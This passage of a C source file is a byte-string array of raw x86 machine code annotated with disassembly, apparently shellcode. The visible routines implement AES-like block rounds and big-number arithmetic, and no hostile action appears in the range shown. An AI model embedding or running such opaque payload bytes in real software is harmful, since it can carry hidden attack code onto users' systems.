  /* 10C0 */ "\x33\xc6"                                 /* xor eax, esi                     */
  /* 10C2 */ "\x5e"                                     /* pop esi                          */
  /* 10C3 */ "\xc3"                                     /* ret                              */
  /* 10C4 */ "\x56"                                     /* push esi                         */
  /* 10C5 */ "\x57"                                     /* push edi                         */
  /* 10C6 */ "\x33\xff"                                 /* xor edi, edi                     */
  /* 10C8 */ "\x83\x7c\x24\x10\x00"                     /* cmp dword [esp+0x10], 0x0        */
  /* 10CD */ "\x8b\x44\x24\x0c"                         /* mov eax, [esp+0xc]               */
  /* 10D1 */ "\x8d\x34\xb8"                             /* lea esi, [eax+edi*4]             */
  /* 10D4 */ "\x8b\x16"                                 /* mov edx, [esi]                   */
  /* 10D6 */ "\x75\x17"                                 /* jnz 0x10ef                       */
  /* 10D8 */ "\x8b\xc2"                                 /* mov eax, edx                     */
  /* 10DA */ "\xc1\xc0\x10"                             /* rol eax, 0x10                    */
  /* 10DD */ "\x33\xc2"                                 /* xor eax, edx                     */
  /* 10DF */ "\x50"                                     /* push eax                         */
  /* 10E0 */ "\xe8\x6a\xfe\xff\xff"                     /* call 0xf4f                       */
  /* 10E5 */ "\x50"                                     /* push eax                         */
  /* 10E6 */ "\xe8\x64\xfe\xff\xff"                     /* call 0xf4f                       */
  /* 10EB */ "\x59"                                     /* pop ecx                          */
  /* 10EC */ "\x59"                                     /* pop ecx                          */
  /* 10ED */ "\x33\xd0"                                 /* xor edx, eax                     */
  /* 10EF */ "\x52"                                     /* push edx                         */
  /* 10F0 */ "\xe8\xaa\xff\xff\xff"                     /* call 0x109f                      */
  /* 10F5 */ "\x47"                                     /* inc edi                          */
  /* 10F6 */ "\x59"                                     /* pop ecx                          */
  /* 10F7 */ "\x89\x06"                                 /* mov [esi], eax                   */
  /* 10F9 */ "\x83\xff\x04"                             /* cmp edi, 0x4                     */
  /* 10FC */ "\x72\xca"                                 /* jb 0x10c8                        */
  /* 10FE */ "\x5f"                                     /* pop edi                          */
  /* 10FF */ "\x5e"                                     /* pop esi                          */
  /* 1100 */ "\xc3"                                     /* ret                              */
  /* 1101 */ "\x55"                                     /* push ebp                         */
  /* 1102 */ "\x8b\xec"                                 /* mov ebp, esp                     */
  /* 1104 */ "\x51"                                     /* push ecx                         */
  /* 1105 */ "\x53"                                     /* push ebx                         */
  /* 1106 */ "\x56"                                     /* push esi                         */
  /* 1107 */ "\x8b\x75\x08"                             /* mov esi, [ebp+0x8]               */
  /* 110A */ "\x57"                                     /* push edi                         */
  /* 110B */ "\x8b\x7d\x0c"                             /* mov edi, [ebp+0xc]               */
  /* 110E */ "\x6a\x20"                                 /* push 0x20                        */
  /* 1110 */ "\x59"                                     /* pop ecx                          */
  /* 1111 */ "\x6a\x08"                                 /* push 0x8                         */
  /* 1113 */ "\xf3\xa4"                                 /* rep movsb                        */
  /* 1115 */ "\x8b\x75\x0c"                             /* mov esi, [ebp+0xc]               */
  /* 1118 */ "\xc6\x45\xff\x01"                         /* mov byte [ebp-0x1], 0x1          */
  /* 111C */ "\x5b"                                     /* pop ebx                          */
  /* 111D */ "\x8b\x56\x1c"                             /* mov edx, [esi+0x1c]              */
  /* 1120 */ "\x8b\xc3"                                 /* mov eax, ebx                     */
  /* 1122 */ "\x25\x07\x00\x00\x80"                     /* and eax, 0x80000007              */
  /* 1127 */ "\x79\x05"                                 /* jns 0x112e                       */
  /* 1129 */ "\x48"                                     /* dec eax                          */
  /* 112A */ "\x83\xc8\xf8"                             /* or eax, 0xfffffff8               */
  /* 112D */ "\x40"                                     /* inc eax                          */
  /* 112E */ "\x75\x1d"                                 /* jnz 0x114d                       */
  /* 1130 */ "\x0f\xb6\x7d\xff"                         /* movzx edi, byte [ebp-0x1]        */
  /* 1134 */ "\xc1\xca\x08"                             /* ror edx, 0x8                     */
  /* 1137 */ "\x52"                                     /* push edx                         */
  /* 1138 */ "\xe8\xb9\xfe\xff\xff"                     /* call 0xff6                       */
  /* 113D */ "\x33\xc7"                                 /* xor eax, edi                     */
  /* 113F */ "\x57"                                     /* push edi                         */
  /* 1140 */ "\x8b\xd0"                                 /* mov edx, eax                     */
  /* 1142 */ "\xe8\x08\xfe\xff\xff"                     /* call 0xf4f                       */
  /* 1147 */ "\x59"                                     /* pop ecx                          */
  /* 1148 */ "\x88\x45\xff"                             /* mov [ebp-0x1], al                */
  /* 114B */ "\xeb\x0d"                                 /* jmp 0x115a                       */
  /* 114D */ "\x83\xf8\x04"                             /* cmp eax, 0x4                     */
  /* 1150 */ "\x75\x09"                                 /* jnz 0x115b                       */
  /* 1152 */ "\x52"                                     /* push edx                         */
  /* 1153 */ "\xe8\x9e\xfe\xff\xff"                     /* call 0xff6                       */
  /* 1158 */ "\x8b\xd0"                                 /* mov edx, eax                     */
  /* 115A */ "\x59"                                     /* pop ecx                          */
  /* 115B */ "\x8b\x06"                                 /* mov eax, [esi]                   */
  /* 115D */ "\x33\xc2"                                 /* xor eax, edx                     */
  /* 115F */ "\x89\x46\x20"                             /* mov [esi+0x20], eax              */
  /* 1162 */ "\x43"                                     /* inc ebx                          */
  /* 1163 */ "\x83\xc6\x04"                             /* add esi, 0x4                     */
  /* 1166 */ "\x83\xfb\x3c"                             /* cmp ebx, 0x3c                    */
  /* 1169 */ "\x7c\xb2"                                 /* jl 0x111d                        */
  /* 116B */ "\x5f"                                     /* pop edi                          */
  /* 116C */ "\x5e"                                     /* pop esi                          */
  /* 116D */ "\x5b"                                     /* pop ebx                          */
  /* 116E */ "\xc9"                                     /* leave                            */
  /* 116F */ "\xc3"                                     /* ret                              */
  /* 1170 */ "\x55"                                     /* push ebp                         */
  /* 1171 */ "\x8b\xec"                                 /* mov ebp, esp                     */
  /* 1173 */ "\x83\xec\x10"                             /* sub esp, 0x10                    */
  /* 1176 */ "\x83\x7d\x14\x01"                         /* cmp dword [ebp+0x14], 0x1        */
  /* 117A */ "\x53"                                     /* push ebx                         */
  /* 117B */ "\x56"                                     /* push esi                         */
  /* 117C */ "\x8b\x75\x08"                             /* mov esi, [ebp+0x8]               */
  /* 117F */ "\x57"                                     /* push edi                         */
  /* 1180 */ "\x6a\x10"                                 /* push 0x10                        */
  /* 1182 */ "\x8d\x7d\xf0"                             /* lea edi, [ebp-0x10]              */
  /* 1185 */ "\x59"                                     /* pop ecx                          */
  /* 1186 */ "\xf3\xa4"                                 /* rep movsb                        */
  /* 1188 */ "\x8d\x45\xf0"                             /* lea eax, [ebp-0x10]              */
  /* 118B */ "\x75\x5b"                                 /* jnz 0x11e8                       */
  /* 118D */ "\x8b\x4d\x10"                             /* mov ecx, [ebp+0x10]              */
  /* 1190 */ "\x33\xf6"                                 /* xor esi, esi                     */
  /* 1192 */ "\x2b\xc8"                                 /* sub ecx, eax                     */
  /* 1194 */ "\x8d\x44\x35\xf0"                         /* lea eax, [ebp+esi-0x10]          */
  /* 1198 */ "\x8a\x14\x01"                             /* mov dl, [ecx+eax]                */
  /* 119B */ "\x30\x10"                                 /* xor [eax], dl                    */
  /* 119D */ "\x46"                                     /* inc esi                          */
  /* 119E */ "\x83\xfe\x10"                             /* cmp esi, 0x10                    */
  /* 11A1 */ "\x72\xf1"                                 /* jb 0x1194                        */
  /* 11A3 */ "\x6a\x0d"                                 /* push 0xd                         */
  /* 11A5 */ "\x8d\x71\x10"                             /* lea esi, [ecx+0x10]              */
  /* 11A8 */ "\x5f"                                     /* pop edi                          */
  /* 11A9 */ "\xb3\x0e"                                 /* mov bl, 0xe                      */
  /* 11AB */ "\x8d\x45\xf0"                             /* lea eax, [ebp-0x10]              */
  /* 11AE */ "\x6a\x01"                                 /* push 0x1                         */
  /* 11B0 */ "\x50"                                     /* push eax                         */
  /* 11B1 */ "\xe8\x69\xfe\xff\xff"                     /* call 0x101f                      */
  /* 11B6 */ "\x8d\x45\xf0"                             /* lea eax, [ebp-0x10]              */
  /* 11B9 */ "\x6a\x01"                                 /* push 0x1                         */
  /* 11BB */ "\x50"                                     /* push eax                         */
  /* 11BC */ "\xe8\x7f\xfe\xff\xff"                     /* call 0x1040                      */
  /* 11C1 */ "\x8d\x45\xf0"                             /* lea eax, [ebp-0x10]              */
  /* 11C4 */ "\x6a\x01"                                 /* push 0x1                         */
  /* 11C6 */ "\x50"                                     /* push eax                         */
  /* 11C7 */ "\xe8\xf8\xfe\xff\xff"                     /* call 0x10c4                      */
  /* 11CC */ "\x83\xc4\x18"                             /* add esp, 0x18                    */
  /* 11CF */ "\x33\xc9"                                 /* xor ecx, ecx                     */
  /* 11D1 */ "\x8d\x44\x0d\xf0"                         /* lea eax, [ebp+ecx-0x10]          */
  /* 11D5 */ "\x8a\x14\x06"                             /* mov dl, [esi+eax]                */
  /* 11D8 */ "\x30\x10"                                 /* xor [eax], dl                    */
  /* 11DA */ "\x41"                                     /* inc ecx                          */
  /* 11DB */ "\x83\xf9\x10"                             /* cmp ecx, 0x10                    */
  /* 11DE */ "\x72\xf1"                                 /* jb 0x11d1                        */
  /* 11E0 */ "\x83\xc6\x10"                             /* add esi, 0x10                    */
  /* 11E3 */ "\x4f"                                     /* dec edi                          */
  /* 11E4 */ "\x75\xc5"                                 /* jnz 0x11ab                       */
  /* 11E6 */ "\xeb\x6c"                                 /* jmp 0x1254                       */
  /* 11E8 */ "\x8b\x7d\x10"                             /* mov edi, [ebp+0x10]              */
  /* 11EB */ "\x8d\xb7\xe0\x00\x00\x00"                 /* lea esi, [edi+0xe0]              */
  /* 11F1 */ "\x33\xc9"                                 /* xor ecx, ecx                     */
  /* 11F3 */ "\x2b\xf0"                                 /* sub esi, eax                     */
  /* 11F5 */ "\x8d\x44\x0d\xf0"                         /* lea eax, [ebp+ecx-0x10]          */
  /* 11F9 */ "\x8a\x14\x06"                             /* mov dl, [esi+eax]                */
  /* 11FC */ "\x30\x10"                                 /* xor [eax], dl                    */
  /* 11FE */ "\x41"                                     /* inc ecx                          */
  /* 11FF */ "\x83\xf9\x10"                             /* cmp ecx, 0x10                    */
  /* 1202 */ "\x72\xf1"                                 /* jb 0x11f5                        */
  /* 1204 */ "\x8b\xf7"                                 /* mov esi, edi                     */
  /* 1206 */ "\x8d\x45\xf0"                             /* lea eax, [ebp-0x10]              */
  /* 1209 */ "\x2b\xf0"                                 /* sub esi, eax                     */
  /* 120B */ "\xb3\x0d"                                 /* mov bl, 0xd                      */
  /* 120D */ "\x81\xc6\xd0\x00\x00\x00"                 /* add esi, 0xd0                    */
  /* 1213 */ "\xff\x75\x14"                             /* push dword [ebp+0x14]            */
  /* 1216 */ "\x8d\x45\xf0"                             /* lea eax, [ebp-0x10]              */
  /* 1219 */ "\x50"                                     /* push eax                         */
  /* 121A */ "\xe8\x00\xfe\xff\xff"                     /* call 0x101f                      */
  /* 121F */ "\xff\x75\x14"                             /* push dword [ebp+0x14]            */
  /* 1222 */ "\x8d\x45\xf0"                             /* lea eax, [ebp-0x10]              */
  /* 1225 */ "\x50"                                     /* push eax                         */
  /* 1226 */ "\xe8\x15\xfe\xff\xff"                     /* call 0x1040                      */
  /* 122B */ "\x83\xc4\x10"                             /* add esp, 0x10                    */
  /* 122E */ "\x33\xc9"                                 /* xor ecx, ecx                     */
  /* 1230 */ "\x8d\x44\x0d\xf0"                         /* lea eax, [ebp+ecx-0x10]          */
  /* 1234 */ "\x8a\x14\x06"                             /* mov dl, [esi+eax]                */
  /* 1237 */ "\x30\x10"                                 /* xor [eax], dl                    */
  /* 1239 */ "\x41"                                     /* inc ecx                          */
  /* 123A */ "\x83\xf9\x10"                             /* cmp ecx, 0x10                    */
  /* 123D */ "\x72\xf1"                                 /* jb 0x1230                        */
  /* 123F */ "\xff\x75\x14"                             /* push dword [ebp+0x14]            */
  /* 1242 */ "\x8d\x45\xf0"                             /* lea eax, [ebp-0x10]              */
  /* 1245 */ "\x50"                                     /* push eax                         */
  /* 1246 */ "\xe8\x79\xfe\xff\xff"                     /* call 0x10c4                      */
  /* 124B */ "\x59"                                     /* pop ecx                          */
  /* 124C */ "\x83\xee\x10"                             /* sub esi, 0x10                    */
  /* 124F */ "\xfe\xcb"                                 /* dec bl                           */
  /* 1251 */ "\x59"                                     /* pop ecx                          */
  /* 1252 */ "\x75\xbf"                                 /* jnz 0x1213                       */
  /* 1254 */ "\xff\x75\x14"                             /* push dword [ebp+0x14]            */
  /* 1257 */ "\x8d\x45\xf0"                             /* lea eax, [ebp-0x10]              */
  /* 125A */ "\x50"                                     /* push eax                         */
  /* 125B */ "\xe8\xbf\xfd\xff\xff"                     /* call 0x101f                      */
  /* 1260 */ "\xff\x75\x14"                             /* push dword [ebp+0x14]            */
  /* 1263 */ "\x8d\x45\xf0"                             /* lea eax, [ebp-0x10]              */
  /* 1266 */ "\x50"                                     /* push eax                         */
  /* 1267 */ "\xe8\xd4\xfd\xff\xff"                     /* call 0x1040                      */
  /* 126C */ "\x0f\xb6\xf3"                             /* movzx esi, bl                    */
  /* 126F */ "\xc1\xe6\x04"                             /* shl esi, 0x4                     */
  /* 1272 */ "\x03\x75\x10"                             /* add esi, [ebp+0x10]              */
  /* 1275 */ "\x8d\x45\xf0"                             /* lea eax, [ebp-0x10]              */
  /* 1278 */ "\x83\xc4\x10"                             /* add esp, 0x10                    */
  /* 127B */ "\x33\xd2"                                 /* xor edx, edx                     */
  /* 127D */ "\x2b\xf0"                                 /* sub esi, eax                     */
  /* 127F */ "\x8d\x4c\x15\xf0"                         /* lea ecx, [ebp+edx-0x10]          */
  /* 1283 */ "\x8a\x04\x0e"                             /* mov al, [esi+ecx]                */
  /* 1286 */ "\x30\x01"                                 /* xor [ecx], al                    */
  /* 1288 */ "\x42"                                     /* inc edx                          */
  /* 1289 */ "\x83\xfa\x10"                             /* cmp edx, 0x10                    */
  /* 128C */ "\x72\xf1"                                 /* jb 0x127f                        */
  /* 128E */ "\x8b\x7d\x0c"                             /* mov edi, [ebp+0xc]               */
  /* 1291 */ "\x6a\x10"                                 /* push 0x10                        */
  /* 1293 */ "\x59"                                     /* pop ecx                          */
  /* 1294 */ "\x8d\x75\xf0"                             /* lea esi, [ebp-0x10]              */
  /* 1297 */ "\xf3\xa4"                                 /* rep movsb                        */
  /* 1299 */ "\x5f"                                     /* pop edi                          */
  /* 129A */ "\x5e"                                     /* pop esi                          */
  /* 129B */ "\x5b"                                     /* pop ebx                          */
  /* 129C */ "\xc9"                                     /* leave                            */
  /* 129D */ "\xc3"                                     /* ret                              */
  /* 129E */ "\x8b\x54\x24\x08"                         /* mov edx, [esp+0x8]               */
  /* 12A2 */ "\x33\xc0"                                 /* xor eax, eax                     */
  /* 12A4 */ "\x8b\xca"                                 /* mov ecx, edx                     */
  /* 12A6 */ "\x83\xe1\x1f"                             /* and ecx, 0x1f                    */
  /* 12A9 */ "\x40"                                     /* inc eax                          */
  /* 12AA */ "\xd3\xe0"                                 /* shl eax, cl                      */
  /* 12AC */ "\x8b\x4c\x24\x04"                         /* mov ecx, [esp+0x4]               */
  /* 12B0 */ "\xc1\xea\x05"                             /* shr edx, 0x5                     */
  /* 12B3 */ "\x23\x04\x91"                             /* and eax, [ecx+edx*4]             */
  /* 12B6 */ "\xc3"                                     /* ret                              */
  /* 12B7 */ "\x56"                                     /* push esi                         */
  /* 12B8 */ "\xbe\xff\x1f\x00\x00"                     /* mov esi, 0x1fff                  */
  /* 12BD */ "\x56"                                     /* push esi                         */
  /* 12BE */ "\xff\x74\x24\x0c"                         /* push dword [esp+0xc]             */
  /* 12C2 */ "\xe8\xd7\xff\xff\xff"                     /* call 0x129e                      */
  /* 12C7 */ "\x59"                                     /* pop ecx                          */
  /* 12C8 */ "\x59"                                     /* pop ecx                          */
  /* 12C9 */ "\x85\xc0"                                 /* test eax, eax                    */
  /* 12CB */ "\x75\x03"                                 /* jnz 0x12d0                       */
  /* 12CD */ "\x4e"                                     /* dec esi                          */
  /* 12CE */ "\x79\xed"                                 /* jns 0x12bd                       */
  /* 12D0 */ "\x8d\x46\x01"                             /* lea eax, [esi+0x1]               */
  /* 12D3 */ "\x5e"                                     /* pop esi                          */
  /* 12D4 */ "\xc3"                                     /* ret                              */
  /* 12D5 */ "\x57"                                     /* push edi                         */
  /* 12D6 */ "\x8b\x7c\x24\x08"                         /* mov edi, [esp+0x8]               */
  /* 12DA */ "\x32\xc0"                                 /* xor al, al                       */
  /* 12DC */ "\xb9\x04\x04\x00\x00"                     /* mov ecx, 0x404                   */
  /* 12E1 */ "\xf3\xaa"                                 /* rep stosb                        */
  /* 12E3 */ "\x5f"                                     /* pop edi                          */
  /* 12E4 */ "\xc3"                                     /* ret                              */
  /* 12E5 */ "\x55"                                     /* push ebp                         */
  /* 12E6 */ "\x8b\xec"                                 /* mov ebp, esp                     */
  /* 12E8 */ "\xb8\x0c\x20\x00\x00"                     /* mov eax, 0x200c                  */
  /* 12ED */ "\xe8\xee\x02\x00\x00"                     /* call 0x15e0                      */
  /* 12F2 */ "\x83\x65\xf8\x00"                         /* and dword [ebp-0x8], 0x0         */
  /* 12F6 */ "\x53"                                     /* push ebx                         */
  /* 12F7 */ "\x56"                                     /* push esi                         */
  /* 12F8 */ "\x8b\x75\x0c"                             /* mov esi, [ebp+0xc]               */
  /* 12FB */ "\x57"                                     /* push edi                         */
  /* 12FC */ "\x32\xc0"                                 /* xor al, al                       */
  /* 12FE */ "\x8d\xbd\xf4\xdf\xff\xff"                 /* lea edi, [ebp-0x200c]            */
  /* 1304 */ "\xb9\x04\x04\x00\x00"                     /* mov ecx, 0x404                   */
  /* 1309 */ "\xf3\xaa"                                 /* rep stosb                        */
  /* 130B */ "\x8b\x4d\x10"                             /* mov ecx, [ebp+0x10]              */
  /* 130E */ "\x8d\x85\xf4\xdf\xff\xff"                 /* lea eax, [ebp-0x200c]            */
  /* 1314 */ "\x2b\xf1"                                 /* sub esi, ecx                     */
  /* 1316 */ "\x2b\xc1"                                 /* sub eax, ecx                     */
  /* 1318 */ "\x89\x45\xf4"                             /* mov [ebp-0xc], eax               */
  /* 131B */ "\xc7\x45\xfc\x00\x01\x00\x00"             /* mov dword [ebp-0x4], 0x100       */
  /* 1322 */ "\x8b\x04\x0e"                             /* mov eax, [esi+ecx]               */
  /* 1325 */ "\x33\xd2"                                 /* xor edx, edx                     */
  /* 1327 */ "\x33\xdb"                                 /* xor ebx, ebx                     */
  /* 1329 */ "\x03\x01"                                 /* add eax, [ecx]                   */
  /* 132B */ "\x13\xd3"                                 /* adc edx, ebx                     */
  /* 132D */ "\x33\xff"                                 /* xor edi, edi                     */
  /* 132F */ "\x03\x45\xf8"                             /* add eax, [ebp-0x8]               */
  /* 1332 */ "\x13\xd7"                                 /* adc edx, edi                     */
  /* 1334 */ "\x8b\x7d\xf4"                             /* mov edi, [ebp-0xc]               */
  /* 1337 */ "\x89\x04\x0f"                             /* mov [edi+ecx], eax               */
  /* 133A */ "\x33\xc0"                                 /* xor eax, eax                     */
  /* 133C */ "\x85\xd2"                                 /* test edx, edx                    */
  /* 133E */ "\x0f\x95\xc0"                             /* setnz al                         */
  /* 1341 */ "\x83\xc1\x04"                             /* add ecx, 0x4                     */
  /* 1344 */ "\xff\x4d\xfc"                             /* dec dword [ebp-0x4]              */
  /* 1347 */ "\x89\x45\xf8"                             /* mov [ebp-0x8], eax               */
  /* 134A */ "\x75\xd6"                                 /* jnz 0x1322                       */
  /* 134C */ "\x8b\x7d\x08"                             /* mov edi, [ebp+0x8]               */
  /* 134F */ "\xba\x04\x04\x00\x00"                     /* mov edx, 0x404                   */
  /* 1354 */ "\x32\xc0"                                 /* xor al, al                       */
  /* 1356 */ "\x8b\xca"                                 /* mov ecx, edx                     */
  /* 1358 */ "\xf3\xaa"                                 /* rep stosb                        */
  /* 135A */ "\x8b\x7d\x08"                             /* mov edi, [ebp+0x8]               */
  /* 135D */ "\x8d\xb5\xf4\xdf\xff\xff"                 /* lea esi, [ebp-0x200c]            */
  /* 1363 */ "\x8b\xca"                                 /* mov ecx, edx                     */
  /* 1365 */ "\xf3\xa4"                                 /* rep movsb                        */
  /* 1367 */ "\x5f"                                     /* pop edi                          */
  /* 1368 */ "\x5e"                                     /* pop esi                          */
  /* 1369 */ "\x5b"                                     /* pop ebx                          */
  /* 136A */ "\xc9"                                     /* leave                            */
  /* 136B */ "\xc3"                                     /* ret                              */
  /* 136C */ "\x55"                                     /* push ebp                         */
  /* 136D */ "\x8b\xec"                                 /* mov ebp, esp                     */
  /* 136F */ "\xb8\x08\x20\x00\x00"                     /* mov eax, 0x2008                  */
  /* 1374 */ "\xe8\x67\x02\x00\x00"                     /* call 0x15e0                      */
  /* 1379 */ "\x53"                                     /* push ebx                         */
  /* 137A */ "\x56"                                     /* push esi                         */
  /* 137B */ "\x8b\x75\x0c"                             /* mov esi, [ebp+0xc]               */
  /* 137E */ "\x57"                                     /* push edi                         */
  /* 137F */ "\x32\xc0"                                 /* xor al, al                       */
  /* 1381 */ "\x8d\xbd\xf8\xdf\xff\xff"                 /* lea edi, [ebp-0x2008]            */
  /* 1387 */ "\xb9\x04\x04\x00\x00"                     /* mov ecx, 0x404                   */
  /* 138C */ "\xf3\xaa"                                 /* rep stosb                        */
  /* 138E */ "\x8b\x45\x10"                             /* mov eax, [ebp+0x10]              */
  /* 1391 */ "\x8d\xbd\xf8\xdf\xff\xff"                 /* lea edi, [ebp-0x2008]            */
  /* 1397 */ "\x33\xd2"                                 /* xor edx, edx                     */
  /* 1399 */ "\x2b\xf0"                                 /* sub esi, eax                     */
  /* 139B */ "\x2b\xf8"                                 /* sub edi, eax                     */
  /* 139D */ "\xc7\x45\xfc\x00\x01\x00\x00"             /* mov dword [ebp-0x4], 0x100       */
  /* 13A4 */ "\x8b\x18"                                 /* mov ebx, [eax]                   */
  /* 13A6 */ "\x8b\x0c\x06"                             /* mov ecx, [esi+eax]               */
  /* 13A9 */ "\x89\x5d\xf8"                             /* mov [ebp-0x8], ebx               */
  /* 13AC */ "\x85\xd2"                                 /* test edx, edx                    */
  /* 13AE */ "\x74\x0f"                                 /* jz 0x13bf                        */
  /* 13B0 */ "\x3b\xd9"                                 /* cmp ebx, ecx                     */
  /* 13B2 */ "\x1b\xd2"                                 /* sbb edx, edx                     */
  /* 13B4 */ "\x83\xcb\xff"                             /* or ebx, 0xffffffff               */
  /* 13B7 */ "\x2b\x5d\xf8"                             /* sub ebx, [ebp-0x8]               */
  /* 13BA */ "\x42"                                     /* inc edx                          */
  /* 13BB */ "\x03\xcb"                                 /* add ecx, ebx                     */
  /* 13BD */ "\xeb\x08"                                 /* jmp 0x13c7                       */
  /* 13BF */ "\x3b\xcb"                                 /* cmp ecx, ebx                     */
  /* 13C1 */ "\x1b\xd2"                                 /* sbb edx, edx                     */
  /* 13C3 */ "\xf7\xda"                                 /* neg edx                          */
  /* 13C5 */ "\x2b\xcb"                                 /* sub ecx, ebx                     */
  /* 13C7 */ "\x89\x0c\x07"                             /* mov [edi+eax], ecx               */
  /* 13CA */ "\x83\xc0\x04"                             /* add eax, 0x4                     */
  /* 13CD */ "\xff\x4d\xfc"                             /* dec dword [ebp-0x4]              */
  /* 13D0 */ "\x75\xd2"                                 /* jnz 0x13a4                       */
  /* 13D2 */ "\x8b\x7d\x08"                             /* mov edi, [ebp+0x8]               */
  /* 13D5 */ "\xba\x04\x04\x00\x00"                     /* mov edx, 0x404                   */
  /* 13DA */ "\x32\xc0"                                 /* xor al, al                       */
  /* 13DC */ "\x8b\xca"                                 /* mov ecx, edx                     */
  /* 13DE */ "\xf3\xaa"                                 /* rep stosb                        */
  /* 13E0 */ "\x8b\x7d\x08"                             /* mov edi, [ebp+0x8]               */
  /* 13E3 */ "\x8d\xb5\xf8\xdf\xff\xff"                 /* lea esi, [ebp-0x2008]            */
  /* 13E9 */ "\x8b\xca"                                 /* mov ecx, edx                     */
  /* 13EB */ "\xf3\xa4"                                 /* rep movsb                        */
  /* 13ED */ "\x5f"                                     /* pop edi                          */
  /* 13EE */ "\x5e"                                     /* pop esi                          */
  /* 13EF */ "\x5b"                                     /* pop ebx                          */
  /* 13F0 */ "\xc9"                                     /* leave                            */
  /* 13F1 */ "\xc3"                                     /* ret                              */
  /* 13F2 */ "\x55"                                     /* push ebp                         */
  /* 13F3 */ "\x8b\xec"                                 /* mov ebp, esp                     */
  /* 13F5 */ "\x51"                                     /* push ecx                         */
  /* 13F6 */ "\x8b\x4d\x0c"                             /* mov ecx, [ebp+0xc]               */
  /* 13F9 */ "\x53"                                     /* push ebx                         */
  /* 13FA */ "\x56"                                     /* push esi                         */
  /* 13FB */ "\x57"                                     /* push edi                         */
  /* 13FC */ "\x8b\x7d\x08"                             /* mov edi, [ebp+0x8]               */
  /* 13FF */ "\x89\x7d\xfc"                             /* mov [ebp-0x4], edi               */
  /* 1402 */ "\x33\xc0"                                 /* xor eax, eax                     */
  /* 1404 */ "\x29\x4d\xfc"                             /* sub [ebp-0x4], ecx               */
  /* 1407 */ "\xbe\xff\x00\x00\x00"                     /* mov esi, 0xff                    */
  /* 140C */ "\x8d\x91\xfc\x03\x00\x00"                 /* lea edx, [ecx+0x3fc]             */
  /* 1412 */ "\x8b\x5d\xfc"                             /* mov ebx, [ebp-0x4]               */
  /* 1415 */ "\x8b\x1c\x13"                             /* mov ebx, [ebx+edx]               */
  /* 1418 */ "\x3b\x1a"                                 /* cmp ebx, [edx]                   */
  /* 141A */ "\x75\x08"                                 /* jnz 0x1424                       */
  /* 141C */ "\x83\xea\x04"                             /* sub edx, 0x4                     */
  /* 141F */ "\x4e"                                     /* dec esi                          */
  /* 1420 */ "\x79\xf0"                                 /* jns 0x1412                       */
  /* 1422 */ "\xeb\x0e"                                 /* jmp 0x1432                       */
  /* 1424 */ "\x8b\xc6"                                 /* mov eax, esi                     */
  /* 1426 */ "\x8b\x14\x87"                             /* mov edx, [edi+eax*4]             */
  /* 1429 */ "\x39\x14\x81"                             /* cmp [ecx+eax*4], edx             */
  /* 142C */ "\x1b\xc0"                                 /* sbb eax, eax                     */
  /* 142E */ "\x83\xe0\x02"                             /* and eax, 0x2                     */
  /* 1431 */ "\x48"                                     /* dec eax                          */
  /* 1432 */ "\x5f"                                     /* pop edi                          */
  /* 1433 */ "\x5e"                                     /* pop esi                          */
  /* 1434 */ "\x5b"                                     /* pop ebx                          */
  /* 1435 */ "\xc9"                                     /* leave                            */
  /* 1436 */ "\xc3"                                     /* ret                              */
  /* 1437 */ "\x55"                                     /* push ebp                         */
  /* 1438 */ "\x8b\xec"                                 /* mov ebp, esp                     */
  /* 143A */ "\x56"                                     /* push esi                         */
  /* 143B */ "\xff\x75\x10"                             /* push dword [ebp+0x10]            */
  /* 143E */ "\x8b\x75\x08"                             /* mov esi, [ebp+0x8]               */
  /* 1441 */ "\xff\x75\x0c"                             /* push dword [ebp+0xc]             */
  /* 1444 */ "\x56"                                     /* push esi                         */
  /* 1445 */ "\xe8\x9b\xfe\xff\xff"                     /* call 0x12e5                      */
  /* 144A */ "\xff\x75\x14"                             /* push dword [ebp+0x14]            */
  /* 144D */ "\x56"                                     /* push esi                         */
  /* 144E */ "\xe8\x9f\xff\xff\xff"                     /* call 0x13f2                      */
  /* 1453 */ "\x83\xc4\x14"                             /* add esp, 0x14                    */
  /* 1456 */ "\x85\xc0"                                 /* test eax, eax                    */
  /* 1458 */ "\x78\x0d"                                 /* js 0x1467                        */
  /* 145A */ "\xff\x75\x14"                             /* push dword [ebp+0x14]            */
  /* 145D */ "\x56"                                     /* push esi                         */
  /* 145E */ "\x56"                                     /* push esi                         */
  /* 145F */ "\xe8\x08\xff\xff\xff"                     /* call 0x136c                      */
  /* 1464 */ "\x83\xc4\x0c"                             /* add esp, 0xc                     */
  /* 1467 */ "\x5e"                                     /* pop esi                          */
  /* 1468 */ "\x5d"                                     /* pop ebp                          */
  /* 1469 */ "\xc3"                                     /* ret                              */
  /* 146A */ "\x55"                                     /* push ebp                         */
  /* 146B */ "\x8b\xec"                                 /* mov ebp, esp                     */
  /* 146D */ "\xb8\x04\x40\x00\x00"                     /* mov eax, 0x4004                  */
  /* 1472 */ "\xe8\x69\x01\x00\x00"                     /* call 0x15e0                      */
  /* 1477 */ "\x53"                                     /* push ebx                         */
  /* 1478 */ "\x56"                                     /* push esi                         */
  /* 1479 */ "\x57"                                     /* push edi                         */
  /* 147A */ "\xff\x75\x10"                             /* push dword [ebp+0x10]            */
  /* 147D */ "\xe8\x35\xfe\xff\xff"                     /* call 0x12b7                      */
  /* 1482 */ "\x8b\x75\x0c"                             /* mov esi, [ebp+0xc]               */
  /* 1485 */ "\xbb\x04\x04\x00\x00"                     /* mov ebx, 0x404                   */
  /* 148A */ "\x89\x45\xfc"                             /* mov [ebp-0x4], eax               */
  /* 148D */ "\x32\xc0"                                 /* xor al, al                       */
  /* 148F */ "\x59"                                     /* pop ecx                          */
  /* 1490 */ "\x8d\xbd\xfc\xbf\xff\xff"                 /* lea edi, [ebp-0x4004]            */
  /* 1496 */ "\x8b\xcb"                                 /* mov ecx, ebx                     */
  /* 1498 */ "\xf3\xaa"                                 /* rep stosb                        */
  /* 149A */ "\x8d\xbd\xfc\xdf\xff\xff"                 /* lea edi, [ebp-0x2004]            */
  /* 14A0 */ "\x8b\xcb"                                 /* mov ecx, ebx                     */
  /* 14A2 */ "\xf3\xaa"                                 /* rep stosb                        */
  /* 14A4 */ "\x8d\xbd\xfc\xdf\xff\xff"                 /* lea edi, [ebp-0x2004]            */
  /* 14AA */ "\x8b\xcb"                                 /* mov ecx, ebx                     */
  /* 14AC */ "\xf3\xaa"                                 /* rep stosb                        */
  /* 14AE */ "\x8d\xbd\xfc\xdf\xff\xff"                 /* lea edi, [ebp-0x2004]            */
  /* 14B4 */ "\x8b\xcb"                                 /* mov ecx, ebx                     */
  /* 14B6 */ "\xf3\xa4"                                 /* rep movsb                        */
